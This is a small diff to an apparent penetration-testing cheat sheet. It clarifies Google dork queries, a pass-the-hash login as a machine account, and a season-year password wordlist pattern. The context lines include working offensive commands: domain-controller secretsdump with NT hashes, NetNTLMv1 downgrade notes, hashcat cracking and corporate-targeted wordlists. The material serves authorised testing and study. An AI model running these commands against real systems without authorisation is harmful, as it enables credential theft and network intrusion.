@@ -48,8 +48,9 @@ dig @<dns-server> <domain> MX
 dig @<dns-server> <domain> TXT                # often leaks SPF (who may send the org's mail)
 subfinder -d <domain> -silent | httpx -ip -asn -title -tech-detect -server -status-code
 nuclei -u <domain> -t dns
-# Google dorks (exploit-db.com/google-hacking-database):
-#   site:<domain> "internal use only" / filetype:xls / password / inurl:"index of" / login|portal|admin
+# Google dorks (exploit-db.com/google-hacking-database) — one query per line:
+#   site:<domain> "internal use only"      site:<domain> filetype:xls
+#   site:<domain> inurl:"index of"         site:<domain> login|portal|admin|upload
 # Names/emails -> usernames: hunter.io, dehashed.com, WeakestLink (LinkedIn scrape).
 
 # --- Microsoft 365 / Entra ID (external, unauth) ---
@@ -316,7 +317,7 @@ impacket-secretsdump -hashes :<NThash> <domain>/'DC$'@<dc-ip>
 
 # NetNTLMv1 is fatal — a captured v1 response downgrades straight to the NT hash:
 #   shuck via crack.sh / shuck.sh/get-shucking.php   (trustedsec.com/blog/practical-attacks-against-ntlmv1)
-nxc smb <ip_address> -u '<host>$' -H <NThash> -d <domain>   # auth as the machine acct
+nxc smb <ip_address> -u '<computer>$' -H <NThash> -d <domain>   # auth as the machine acct (NetBIOS name + $)
 ////////////////////////////////////////
 
 
@@ -357,7 +358,7 @@ hashcat -m 5500 -O hashes.txt -a 6 wordlist.txt ?d?d?d?d                    # -a
 #   best64.rule (fast)  OneRuleToRuleThemAll  NSAKEY/nsa-rules  nyxgeek-rules
 
 # TARGETED wordlists beat raw rockyou on corporate passwords:
-exrex "(Winter|Spring|Summer|Fall|Autumn)20(1[7-9]|2[0-5])" > seasons.txt    # Season+Year
+exrex "(Winter|Spring|Summer|Fall|Autumn)20(1[7-9]|2[0-9])" > seasons.txt    # Season+Year (2017–2029)
 cupp -i                                                                       # OSINT-driven (names/dates/pets)
 kwp basechars/full.base keymaps/en-us.keymap routes/2-to-10-max-3-direction-changes.route > kwalks.txt
 # PACK: profile a real dump's masks, then crack within this org's policy:
